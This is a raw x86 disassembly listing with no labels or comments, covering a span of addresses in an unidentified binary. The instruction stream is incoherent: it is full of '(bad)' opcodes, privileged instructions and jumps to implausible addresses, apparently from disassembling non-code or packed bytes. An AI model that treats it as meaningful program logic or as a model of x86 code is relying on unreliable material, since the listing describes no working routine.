  431ce9:	or     BYTE PTR [ecx+ebx*1],cl
  431cec:	push   ebp
  431ced:	inc    ebp
  431cee:	in     al,dx
  431cef:	add    ebp,esp
  431cf1:	or     bh,al
  431cf3:	dec    ebp
  431cf4:	cld    
  431cf5:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431cfb:	xor    DWORD PTR [edx],0x2
  431cfe:	pushf  
  431cff:	dec    DWORD PTR [ebx+0x45510cf4]
  431d05:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431d0b:	mov    edx,DWORD PTR [ecx+0xc]
  431d0e:	xor    eax,esi
  431d10:	mov    edx,0xc172c7
  431d15:	inc    ebp
  431d16:	mov    esi,DWORD PTR [ebp+0x8]
  431d19:	mov    eax,edx
  431d1b:	call   0x84c7e410
  431d20:	add    DWORD PTR [ebx-0x76bace00],ebx
  431d26:	mov    ebp,eax
  431d28:	or     BYTE PTR [eax],dl
  431d2a:	jo     0x431d79
  431d2c:	push   edi
  431d2d:	xor    esi,DWORD PTR [ebp+0x3]
  431d30:	(bad)  
  431d31:	pmulhuw mm0,mm1
  431d34:	test   DWORD PTR [ebp-0x8],ecx
  431d37:	mov    DWORD PTR [ebp-0x67],eax
  431d3a:	mov    eax,DWORD PTR [ebp-0x4]
  431d3d:	xor    edi,DWORD PTR [ebp-0x73]
  431d40:	xor    eax,DWORD PTR [ebx]
  431d42:	xor    esi,DWORD PTR [edx+0x3]
  431d45:	add    BYTE PTR [ecx],bh
  431d47:	inc    ebp
  431d48:	(bad)  
  431d49:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431d4f:	mov    DWORD PTR [eax],0x750f0004
  431d55:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431d5b:	lock add BYTE PTR [ebp+0x0],cl
  431d5f:	mov    esi,DWORD PTR [ebp-0x18]
  431d62:	mov    ebp,edx
  431d64:	or     al,0x72
  431d66:	ja     0x431d68
  431d68:	mov    edx,esi
  431d6a:	cld    
  431d6b:	(bad)  
  431d6e:	cli    
  431d6f:	mov    esi,DWORD PTR [ebp-0x4]
  431d72:	cmp    ecx,esi
  431d74:	bswap  edi
  431d76:	(bad)
  431d7a:	mov    esi,DWORD PTR [ebp-0x4]
  431d7d:	mov    esi,ecx
  431d7f:	clc    
  431d80:	repnz add esi,DWORD PTR [ebp+0x45]
  431d84:	push   ebx
  431d85:	xor    eax,DWORD PTR [ebp+0x3]
  431d88:	cmp    al,0x5f
  431d8a:	pushf  
  431d8b:	pop    ebx
  431d8c:	jmp    0x431e53
  431d91:	mov    esi,DWORD PTR [ebp-0x7d]
  431d94:	xor    ebp,DWORD PTR [eax]
  431d96:	lea    eax,[ebp-0x8]
  431d99:	xor    edx,esi
  431d9b:	pushf  
  431d9c:	out    dx,eax
  431d9d:	(bad)  
  431d9e:	neg    eax
  431da0:	ins    DWORD PTR es:[edi],dx
  431da1:	test   esi,edi
  431da3:	clc    
  431da4:	pop    esp
  431da5:	inc    ebp
  431da6:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431dac:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431db2:	add    cl,al
  431db4:	jne    0x431d51
  431db6:	mov    esi,DWORD PTR [edx]
  431db8:	in     al,dx
  431db9:	push   esi
  431dba:	xor    BYTE PTR [ebp-0xe],dh
  431dbd:	add    edi,esi
  431dbf:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431dc5:	add    cl,bh
  431dc7:	mov    edi,DWORD PTR [ebp+0x8]
  431dca:	mov    DWORD PTR [ebp-0x14],esi
  431dcd:	add    esi,DWORD PTR [ebp+0x3c]
  431dd0:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431dd6:	mov    ah,0x3e
  431dd8:	fwait
  431dd9:	pushf  
  431dda:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431de0:	jne    0x431d6d
  431de2:	mov    ecx,DWORD PTR [esp+ebp*8]
  431de5:	icebp  
  431de6:	icebp  
  431de7:	shl    edx,0xf2
  431dea:	(bad)  
  431deb:	mov    ah,0x16
  431ded:	push   eax
  431dee:	jne    0x431d83
  431df0:	mov    ecx,DWORD PTR [edi]
  431df2:	in     al,dx
  431df3:	jmp    0x431de6
  431df5:	add    dl,dh
  431df7:	mov    edi,esi
  431df9:	or     al,0x8
  431dfb:	inc    ebp
  431dfc:	jne    0x431e01
  431dfe:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431e04:	ret    
  431e05:	or     bh,bh
  431e07:	jge    0x431df1
  431e09:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431e0f:	xor    edi,eax
  431e11:	add    esi,DWORD PTR [ebp-0x77]
  431e14:	mov    ebx,esp
  431e16:	clc    
  431e17:	neg    DWORD PTR [ebp-0x7c]
  431e1a:	xor    eax,DWORD PTR [eax]
  431e1c:	cmp    eax,DWORD PTR [eax]
  431e1e:	repz jne 0x431db6
  431e21:	xor    eax,DWORD PTR [ecx]
  431e23:	add    ebx,DWORD PTR [eax]
  431e25:	mov    DWORD PTR [ebp-0x8],eax
  431e28:	mov    eax,edi
  431e2a:	cld    
  431e2b:	lock pop eax
  431e2d:	test   DWORD PTR [ebx],esi
  431e2f:	clc    
  431e30:	add    edx,DWORD PTR [edi-0x740bff77]
  431e36:	fdivp  st(4),st
  431e38:	test   ecx,esi
  431e3a:	(bad)  
  431e3b:	jnp    0x431e3c
  431e3d:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431e43:	jae    0x431dd0
  431e45:	sub    edi,esp
  431e47:	(bad)  
  431e48:	shl    DWORD PTR [eax-0x3e],0x89
  431e4c:	leave  
  431e4d:	call   0x8198d55a
  431e52:	in     al,dx
  431e53:	(bad)  
  431e54:	in     al,dx
  431e55:	add    bh,al
  431e57:	mov    esp,edi
  431e59:	in     al,dx
  431e5a:	test   DWORD PTR [ebp-0x8],edi
  431e5d:	mov    eax,DWORD PTR [ebp+0x2b]
  431e60:	xor    al,BYTE PTR [ebx]
  431e62:	pushf  
  431e63:	jnp    0x57321a9c
  431e69:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431e6d:	loopne 0x431ea2
  431e6f:	jne    0x431e2c
  431e71:	mov    esi,DWORD PTR [edx-0x20]
  431e74:	add    BYTE PTR [ebp-0x3d],bh
  431e77:	xor    eax,DWORD PTR [ebp-0x73]
  431e7a:	mov    edi,DWORD PTR [esi]
  431e7c:	cld    
  431e7d:	jb     0x431e45
  431e7f:	add    bl,al
  431e81:	jne    0x431ec8
  431e83:	mov    edx,DWORD PTR [edi-0x10]
  431e86:	jge    0x431f05
  431e88:	mov    esi,DWORD PTR [ebx]
  431e8a:	lock add ecx,DWORD PTR [ebp+0x3b]
  431e8e:	xor    esi,DWORD PTR [ebp-0x77]
  431e91:	mov    esi,eax
  431e93:	lock inc ebp
  431e95:	jge    0x431ec8
  431e97:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431e9e:	dec    ebp
  431e9f:	mov    esi,DWORD PTR [ebx]
  431ea1:	loopne 0x431e2c
  431ea3:	jge    0x431e9d
  431ea5:	add    DWORD PTR [ebp-0x7d],eax
  431ea8:	icebp  
  431ea9:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431eb0:	dec    ebp
  431eb1:	hlt    
  431eb2:	xor    ebx,DWORD PTR [ebp-0x77]
  431eb5:	mov    esi,esp
  431eb7:	in     al,0x45
  431eb9:	jge    0x431ef8
  431ebb:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431ec2:	dec    ebp
  431ec3:	push   esp
  431ec4:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431eca:	inc    ebp
  431ecb:	hlt    
  431ecc:	xor    DWORD PTR [ebp-0x61],esi
  431ecf:	mov    edi,DWORD PTR [eax+0xf19504]
  431ed5:	repnz mov DWORD PTR [ebp+0x20],ebx
  431ed9:	cmp    eax,DWORD PTR [ebp+0xf]
  431edc:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431ee0:	fistp  WORD PTR [ebx+0x0]
  431ee3:	inc    ebp
  431ee4:	mov    ebx,DWORD PTR [edi+0xc]
  431ee7:	add    eax,eax
  431ee9:	inc    ebp
  431eea:	test   BYTE PTR [ebx],dh
  431eec:	add    eax,DWORD PTR [ebx]
  431eee:	add    BYTE PTR [esi+0x45],bl
  431ef1:	ret    0x85
  431ef4:	jnp    0x5443a2c3
  431efa:	inc    bp
  431efc:	inc    ebp
  431efd:	xor    DWORD PTR [ecx+0xc78a9c],edi
  431f03:	fdiv   QWORD PTR [ebx]
  431f05:	test   DWORD PTR [ecx+0x453bf8],edi
  431f0b:	push   ebx
  431f0c:	add    edi,DWORD PTR [esi+0x708088b]
  431f12:	cmp    esi,eax
  431f14:	setnp  BYTE PTR [ecx-0x74fcffce]
  431f1b:	mov    esp,edi
  431f1d:	call   0x33ce646f
  431f22:	or     BYTE PTR [ebx],al
  431f24:	inc    ecx
  431f25:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  431f2b:	and    BYTE PTR [ebp-0x7074f0bb],al
  431f31:	lock add cl,al
  431f34:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  431f3b:	mov    ch,0x45
  431f3d:	clc    
  431f3e:	xor    eax,DWORD PTR [ebp+0x3]
  431f41:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  431f47:	inc    ebp
  431f48:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  431f4e:	mov    edi,eax
  431f50:	mov    eax,DWORD PTR [ebp+0x3c]
  431f53:	mov    ecx,DWORD PTR [eax]
  431f55:	hlt    
  431f56:	inc    ebp
  431f57:	ror    DWORD PTR [ebx+0x818c45],0xf4
  431f5e:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  431f64:	push   ebp
  431f65:	mov    edi,DWORD PTR [ebx]
  431f67:	in     al,dx
  431f68:	jne    0x431f2b
  431f6a:	mov    eax,DWORD PTR [ebp-0x28]
  431f6d:	add    DWORD PTR [eax],0xe8058dec
  431f73:	clc    
  431f74:	mov    esi,DWORD PTR [edi-0x8]
  431f77:	add    dh,dl
  431f79:	rol    WORD PTR [ebp-0x1],cl
  431f7d:	mov    edx,DWORD PTR [eax+0x8]
  431f80:	jne    0x431f42
  431f82:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  431f89:	inc    ebp
  431f8a:	push   esp
  431f8b:	test   DWORD PTR [ecx+0xf],ecx
  431f8e:	sub    edx,esp
  431f90:	add    eax,DWORD PTR [eax]
  431f92:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  431f98:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  431f9f:	mov    eax,DWORD PTR [ecx]
  431fa1:	and    BYTE PTR [eax],al
  431fa3:	cmp    al,0x10
  431fa5:	add    BYTE PTR [ebp+0x66],al
  431fa8:	inc    ecx
  431faa:	push   esp
  431fab:	add    dh,BYTE PTR [ebp+0x0]
  431fae:	push   edx
  431faf:	enterw 0xc1,0x4d
  431fb4:	mov    esp,DWORD PTR [esi+0x20]
  431fb7:	add    DWORD PTR [ecx-0x7b],eax
  431fba:	add    eax,DWORD PTR [ebx]
  431fbc:	str    WORD PTR [eax+0x45]
  431fc0:	lea    ecx,[ebx+0x45890801]
  431fc6:	sbb    BYTE PTR [ebx],al
  431fc8:	dec    ebp
  431fc9:	cmp    al,0xf
  431fcb:	inc    ebp
  431fcc:	push   eax
  431fcd:	mov    esi,DWORD PTR [ebx]
  431fcf:	push   eax
  431fd0:	add    eax,eax
  431fd2:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  431fd9:	inc    ebp
  431fda:	add    BYTE PTR [ecx],dh
  431fdc:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  431fe3:	(bad)  
  431fe4:	mov    ebx,eax
  431fe6:	loopne 0x43202d
  431fe8:	dec    ebp
  431fe9:	mov    ecx,DWORD PTR [edi]
  431feb:	cld    
  431fec:	push   eax
  431fed:	xchg   DWORD PTR [ebx],esi
  431fef:	add    DWORD PTR [ebx],ebp
  431ff1:	add    BYTE PTR [ebx],ch
  431ff3:	or     BYTE PTR [ecx],bh
  431ff5:	dec    ecx
  431ff6:	loopne 0x431ffb
  431ff8:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  431ffe:	push   ebp
  431fff:	add    DWORD PTR [ebx+0x55100800],eax
  432005:	dec    ebp
  432006:	jmp    0x431f91
  432008:	mov    esp,DWORD PTR [eax]
  43200a:	sbb    dl,dl
  43200c:	inc    eax
  43200d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432013:	add    BYTE PTR [ebx+0x74528555],cl
  432019:	push   ebp
  43201a:	div    DWORD PTR [ebx]
  43201c:	and    eax,DWORD PTR [ebx]
  43201e:	add    edx,DWORD PTR [edx-0x30]
  432021:	jno    0x431fae
  432023:	inc    DWORD PTR [eax+eiz*1]
  432026:	inc    ebp
  432027:	push   eax
  432028:	push   eax
  432029:	mov    esp,DWORD PTR [edi-0x74beff1c]
  43202f:	mov    edi,esp
  432031:	push   eax
  432032:	inc    ebp
  432033:	enter  0x458b,0x8
  432037:	push   ecx
  432038:	(bad)  
  432039:	call   0x10d2a11
  43203e:	pop    ss
  43203f:	push   ebp
  432040:	mov    ecx,DWORD PTR [ebx+0x489408]
  432046:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  43204c:	push   ecx
  43204d:	jo     0x432037
  43204f:	inc    DWORD PTR [edi]
  432051:	or     BYTE PTR [eax],al
  432053:	call   0xce279d
  432058:	fmul   QWORD PTR [ebp+0x55]
  43205b:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432061:	mov    bh,0x8c
  432063:	adc    al,0x9b
  432065:	dec    esp
  432066:	xor    bl,BYTE PTR [eax]
  432068:	mov    ecx,DWORD PTR [ebp+0xc]
  43206b:	mov    eax,DWORD PTR [ebp-0x4]
  43206e:	mov    esi,DWORD PTR [edi-0x3148f924]
  432074:	push   es
  432075:	retf   
  432076:	mov    BYTE PTR [ebp-0x30],0x3b
  43207a:	inc    ebp
  43207b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432082:	retf   0x83fc
  432085:	into   
  432086:	dec    ebp
  432087:	retf   
  432088:	mov    ecx,DWORD PTR [ebp-0x74]
  43208b:	mov    eax,DWORD PTR [eax]
  43208d:	fdiv   QWORD PTR [ebx]
  43208f:	mov    bh,0x3
  432091:	push   es
  432092:	mov    esi,ecx
  432094:	sbb    cl,dl
  432096:	dec    ebp
  432097:	sar    DWORD PTR [ebx],cl
  432099:	push   ebp
  43209a:	jne    0x4320ab
  43209c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4320a2:	lea    ebx,[eax]
  4320a4:	call   0xf4ccac6b
  4320a9:	sbb    dh,dl
  4320ab:	add    edx,ebx
  4320ad:	push   ebp
  4320ae:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4320b4:	push   ecx
  4320b5:	mov    DWORD PTR [eax-0x30],edx
  4320b8:	test   DWORD PTR [edx],eax
  4320ba:	xadd   esp,esi
  4320bd:	pop    es
  4320be:	add    cl,dl
  4320c0:	mov    eax,ecx
  4320c2:	or     al,0x45
  4320c4:	(bad)  
  4320c5:	push   eax
  4320c6:	add    DWORD PTR [edx+0x0],eax
  4320c9:	add    ecx,DWORD PTR [ecx]
  4320cb:	and    dh,cl
  4320cd:	call   0xc7299d
  4320d2:	add    DWORD PTR [ebp+0x0],edx
  4320d5:	mov    esp,DWORD PTR [ebp+0x18]
  4320d8:	add    BYTE PTR [eax+0x50],cl
  4320db:	xor    eax,DWORD PTR [eax]
  4320dd:	add    esp,DWORD PTR [esi+0x3b]
  4320e0:	inc    ebp
  4320e1:	je     0x432066
  4320e3:	push   ecx
  4320e4:	dec    BYTE PTR [ebp-0x77]
  4320e7:	add    eax,esi
  4320e9:	or     al,0x5e
  4320eb:	inc    eax
  4320ec:	add    BYTE PTR [ebx],al
  4320ee:	data16 and BYTE PTR [ebp+0x50],al
  4320f2:	sub    DWORD PTR [ecx],0xfffffff8
  4320f5:	add    BYTE PTR [ebp-0x75],ah
  4320f8:	add    BYTE PTR [eax],bl
  4320fa:	enter  0x894d,0x8b
  4320fe:	int3   
  4320ff:	loopne 0x4320c3
  432101:	rol    BYTE PTR [eax],0x33
  432104:	lea    cx,[ebp+0xa]
  432108:	data16 jb 0x432150
  43210b:	add    BYTE PTR [ebx+0x44890855],cl
  432111:	sbb    ah,al
  432113:	inc    ebp
  432114:	cmp    al,0xf
  432116:	add    BYTE PTR [edx+0x66],dl
  432119:	xor    ecx,DWORD PTR [eax]
  43211b:	sub    eax,DWORD PTR [edx]
  43211d:	mov    eax,DWORD PTR [eax]
  43211f:	or     al,0x66
  432121:	ror    edx,cl
  432123:	dec    ebp
  432124:	inc    ebp
  432125:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43212b:	cld    
  43212c:	or     BYTE PTR [edi+0x4501dd],dl
  432132:	ret    0xecce
  432135:	retf   
  432136:	(bad)  
  432137:	dec    ebp
  432138:	mov    al,0x8b
  43213a:	loopne 0x43215c
  43213c:	cmp    ecx,DWORD PTR [edx]
  43213e:	inc    ebp
  43213f:	daa    
  432140:	loopne 0x4320c9
  432142:	in     al,dx
  432143:	add    edi,eax
  432145:	add    BYTE PTR [eax+0x3f52e155],bh
  43214b:	push   ebp
  43214c:	inc    ebp
  43214d:	xor    ebx,edx
  43214f:	add    ebp,esp
  432151:	push   edx
  432152:	push   bp
  432154:	inc    ebp
  432155:	(bad)  
  432156:	in     eax,dx
  432157:	push   esp
  432158:	(bad)  
  432159:	inc    edx
  43215b:	sbb    al,0x33
  43215d:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432164:	add    BYTE PTR [ebp+0x46],0x8b
  432168:	jmp    0xf98b:0x100041c8
  43216f:	xor    esi,DWORD PTR [edx+0x3]
  432172:	mov    ecx,DWORD PTR [edi]
  432174:	fmul   DWORD PTR [edx]
  432176:	add    BYTE PTR [eax],al
  432178:	lea    eax,[ebx-0x4700273c]
  43217e:	add    al,0x4f
  432180:	pop    DWORD PTR [eax]
  432182:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  432188:	push   edx
  432189:	inc    WORD PTR [ebp+0x8]
  43218d:	mov    eax,0x514f4d
  432192:	(bad)
  432196:	add    al,al
  432198:	xor    DWORD PTR [ebx-0x74baf730],eax
  43219e:	test   DWORD PTR [esi+0x74],esp
  4321a1:	inc    ebp
  4321a2:	mov    DWORD PTR [eax+0xa4e08],edi
  4321a8:	add    BYTE PTR [ecx-0x76c435bb],cl
  4321ae:	or     dh,cl
  4321b0:	or     eax,0x8b8d5045
  4321b5:	inc    ebp
  4321b6:	mov    WORD PTR [ecx+0x3b8a00],?
  4321bc:	jne    0x4321f1
  4321be:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4321c4:	add    DWORD PTR [ebx],eax
  4321c6:	add    bh,bh
  4321c8:	adc    DWORD PTR [eax],ecx
  4321ca:	adc    DWORD PTR [ebp+0x55],edi
  4321cd:	push   es
  4321ce:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4321d4:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4321db:	inc    ebp
  4321dc:	mov    esp,edi
  4321de:	or     al,0xda
  4321e0:	push   eax
  4321e1:	(bad)  
  4321e2:	jne    0x432198
  4321e4:	call   0x3b1ad3
  4321e9:	inc    ebp
  4321ea:	sar    BYTE PTR [eax],0x84
  4321ed:	in     al,dx
  4321ee:	add    bh,al
  4321f0:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  4321f7:	(bad)  
  4321f8:	and    al,al
  4321fa:	fs in  eax,dx
  4321fc:	inc    DWORD PTR [ebp-0x7b]
  4321ff:	jle    0x432210
  432201:	leave  
  432202:	scas   al,BYTE PTR es:[edi]
  432203:	inc    esp
  432204:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43220b:	or     BYTE PTR [ebx-0x97717c8],0x83
  432212:	call   DWORD PTR [edi]
  432214:	shr    ah,0x84
  432217:	xchg   DWORD PTR [eax],eax
  432219:	add    DWORD PTR [eax],eax
  43221b:	add    bh,bh
  43221d:	dec    ebp
  43221e:	and    BYTE PTR [ecx-0x38],dl
  432221:	push   eax
  432222:	dec    DWORD PTR [ebx+0xfd885]
  432228:	mov    BYTE PTR [ebp+0x508bac00],cl
  43222e:	mov    WORD PTR [ecx+0x0],ss
  432231:	lea    ecx,[ebx+0x108b20d8]
  432237:	mov    WORD PTR [edx],ds
  432239:	add    BYTE PTR [edi+0xff01ff],al
  43223f:	mov    ecx,DWORD PTR [ebp-0x28]
  432242:	push   ecx
  432243:	shl    BYTE PTR [ebp+0x3a],0x8b
  432247:	inc    ebp
  432248:	in     al,0xeb
  43224a:	jno    0x4321d7
  43224c:	push   edx
  43224d:	mov    DWORD PTR [eax-0x28],edx
  432250:	mov    eax,DWORD PTR [ebp+0x20]
  432253:	je     0x4321dc
  432255:	mov    eax,DWORD PTR [ecx]
  432257:	sbb    BYTE PTR [eax],al
  432259:	pop    DWORD PTR [eax]
  43225b:	add    esi,eax
  43225d:	add    bl,al
  43225f:	adc    DWORD PTR [edi],esi
  432261:	jmp    0x8bce72b3
  432266:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  43226d:	jne    0x4321fa
  43226f:	mov    ecx,DWORD PTR [eax]
  432271:	in     al,0x75
  432273:	pop    DWORD PTR [ecx+0x5401]
  432279:	push   edx
  43227a:	inc    DWORD PTR [ebx]
  43227c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432282:	add    BYTE PTR [edi+0x9],dl
  432285:	call   DWORD PTR [esi]
  432287:	and    dl,al
  432289:	and    bh,bh
  43228b:	inc    edi
  43228d:	test   eax,edx
  43228f:	sldt   ebx
  432292:	xor    al,BYTE PTR [eax]
  432294:	pushf  
  432295:	(bad)  
  432296:	jmp    0x4322a4
  432298:	mov    eax,edi
  43229a:	or     al,0x75
  43229c:	inc    eax
  43229d:	call   0x4319a5
  4322a2:	mov    eax,eax
  4322a4:	loopne 0x43222a
  4322a6:	inc    ebp
  4322a7:	add    BYTE PTR [ebx+0x1451c00],cl
  4322ad:	mov    eax,DWORD PTR [ebp+0x20]
  4322b0:	add    edi,ecx
  4322b2:	add    BYTE PTR [eax],ch
  4322b4:	cmp    edi,0x18
  4322b7:	test   DWORD PTR [ebp+0xf],esi
  4322ba:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4322c1:	jne    0x4322c5
  4322c3:	call   0xffa21d88
  4322c8:	leave  
  4322c9:	rcr    BYTE PTR [esp+eax*4],0x55
  4322cd:	add    ah,ch
  4322cf:	add    BYTE PTR [edi-0x48fef979],dh
  4322d5:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4322dc:	inc    esp
  4322dd:	mov    ebx,DWORD PTR [eax]
  4322df:	fcom   st(2)
  4322e1:	add    BYTE PTR [edi],bl
  4322e3:	lea    ecx,[eax-0x18]
  4322e6:	(bad)  
  4322e7:	push   DWORD PTR [ecx]
  4322e9:	call   0xffb5704b
  4322ee:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  4322f2:	fstp   DWORD PTR [esi+ebx*8]
  4322f5:	push   ebp
  4322f6:	pop    ebp
  4322f7:	mov    esi,DWORD PTR [edx-0x38]
  4322fa:	add    DWORD PTR [eax],0x28
  4322fd:	mov    edi,DWORD PTR [ebx]
  4322ff:	xor    esi,DWORD PTR [edx+0x3]
  432302:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  432306:	pop    ebp
  432307:	or     al,0x4
  432309:	inc    ecx
  43230a:	push   ebp
  43230b:	(bad)  
  43230c:	in     al,dx
  43230d:	or     ah,ch
  43230f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432310:	xbegin 0xffc89906
  432316:	clc    
  432317:	adc    al,0x45
  432319:	div    BYTE PTR [edx]
  43231b:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432322:	test   DWORD PTR [ebx+0x666300f8],ebx
  432328:	add    BYTE PTR [ecx+0x66],dh
  43232b:	add    eax,DWORD PTR [ebp+0x52]
  43232e:	adc    eax,0xffffffa0
  432331:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  432337:	test   DWORD PTR [eax],eax
  432339:	clc    
  43233a:	data16 or al,BYTE PTR [ebp+0x45]
  43233e:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432345:	rol    BYTE PTR [ebp+0x45],1
  432348:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  43234e:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432354:	push   ebx
  432355:	add    BYTE PTR [eax+eax*1+0x51],dl
  432359:	jge    0x43238e
  43235b:	add    BYTE PTR [esi+0x4],dl
  43235e:	jne    0x4323c5
  432360:	mov    edx,0x457200
  432365:	jmp    0x432329
  432367:	xor    edi,DWORD PTR [ebx]
  432369:	pop    edi
  43236a:	cvtdq2ps xmm7,xmm0
  43236d:	ret    0x0
  432370:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  432376:	xor    ecx,DWORD PTR [edi]
  432378:	add    eax,DWORD PTR [ecx+0x3b]
  43237b:	push   ebx
  43237c:	rdpmc  
  43237e:	out    0x8d,al
  432380:	add    BYTE PTR [eax],cl
  432382:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  432388:	ret    0x450c
  43238b:	sbb    al,0x8b
  43238d:	cmp    eax,esi
  43238f:	or     cl,al
  432391:	or     al,0xc2
  432393:	pop    eax
  432394:	inc    ebp
  432395:	add    ecx,DWORD PTR [edi]
  432397:	add    esi,DWORD PTR [ebp+0x39]
  43239a:	invd   
  43239c:	jge    0x4323a8
  43239e:	mov    eax,0x478ac0
  4323a3:	cli    
  4323a4:	xor    esp,ecx
  4323a6:	mov    ebx,0x5b8ac0
  4323ab:	ret    0x33
  4323ae:	mov    eax,0x833b8b
  4323b3:	sub    BYTE PTR [ebx],al
  4323b5:	inc    ebp
  4323b6:	xor    ax,di
  4323b9:	pushf  
  4323ba:	inc    bh
  4323bc:	mov    esp,esp
  4323be:	hlt    
  4323bf:	test   DWORD PTR [ebp-0x8],esi
  4323c2:	mov    eax,DWORD PTR [ebp-0x14]
  4323c5:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4323cb:	dec    edi
  4323cc:	or     BYTE PTR [eax],al
  4323ce:	jne    0x432359
  4323d0:	mov    esi,esp
  4323d2:	call   0x77a9af97
  4323d7:	inc    ebp
  4323d8:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4323de:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4323e4:	add    BYTE PTR [esi+0x7d],ah
  4323e7:	inc    ebp
  4323e8:	mov    bx,WORD PTR [ebp+0x8]
  4323ec:	add    DWORD PTR [ebp+0x54],0x30c008b
  4323f3:	inc    ebp
  4323f4:	mov    bx,di
  4323f7:	lock test BYTE PTR [ecx+0x7000801],bh
  4323fe:	jge    0x4323c1
  432400:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  432406:	cli    
  432407:	xor    bl,bh
  432409:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  43240f:	test   BYTE PTR [eax],cl
  432411:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  432418:	cmp    ebp,eax
  43241a:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432421:	test   BYTE PTR [ebp+0x1],bh
  432424:	mov    ebx,0x458a00
  432429:	xor    esi,DWORD PTR [ebx]
  43242b:	add    esp,DWORD PTR [esi-0x77]
  43242e:	pop    ebp
  43242f:	loopne 0x432497
  432431:	inc    ebp
  432432:	clc    
  432433:	xor    edi,DWORD PTR [ebx]
  432435:	add    esi,DWORD PTR [edx-0x77]
  432438:	data16 fdivr QWORD PTR [ebp-0x49]
  43243c:	mov    ebx,0xb78afc
  432441:	hlt    
  432442:	xor    edi,DWORD PTR [esi+eiz*2]
  432445:	add    BYTE PTR [ebp+0x66],bl
  432448:	data16 lock clc 
  43244b:	cmp    al,0x3b
  43244d:	add    BYTE PTR [edi+0x66],dh
  432450:	psubq  mm7,QWORD PTR [ebp+0x2]
  432454:	ltr    WORD PTR [ebp+0x66]
  432458:	add    esi,eax
  43245a:	add    di,WORD PTR [ebp+0x2b]
  43245e:	data16 data16 jge 0x4324df
  432462:	mov    ebx,0xe08a8b
  432467:	jge    0x43249c
  432469:	data16 data16 xor al,0x5d
  43246d:	data16 data16 jne 0x432469
  432471:	mov    edi,DWORD PTR [ebx]
  432473:	fdiv   QWORD PTR [edx+0x7d]
  432476:	data16 data16 jge 0x4324ae
  43247a:	mov    ebx,0x758a66
  43247f:	mov    esi,0x667233
  432484:	pop    ebp
  432485:	or     BYTE PTR [esi+0x0],ah
  432488:	clc    
  432489:	mov    edi,DWORD PTR [ebx]
  43248b:	lock ja 0x432419
  43248e:	(bad)  
  432490:	jge    0x432489
  432492:	invd   
  432494:	pop    ebp
  432495:	add    BYTE PTR [ebx],al
  432497:	(bad)  
  432498:	cmp    di,WORD PTR [ebp+0xf]
  43249c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4324a0:	mov    bx,WORD PTR [ebp-0x10]
  4324a4:	pop    bp
  4324a6:	fbstp  TBYTE PTR [ebx]
  4324a8:	test   DWORD PTR [ebx],eax
  4324aa:	add    BYTE PTR [ebx],bh
  4324ac:	add    BYTE PTR [esi+0x7d],ah
  4324af:	jge    0x43243c
  4324b1:	data16 in al,dx
  4324b3:	pop    ebp
  4324b4:	stc    
  4324b5:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4324bc:	mov    edi,ebx
  4324be:	in     al,dx
  4324bf:	test   BYTE PTR [ebp+0x0],bh
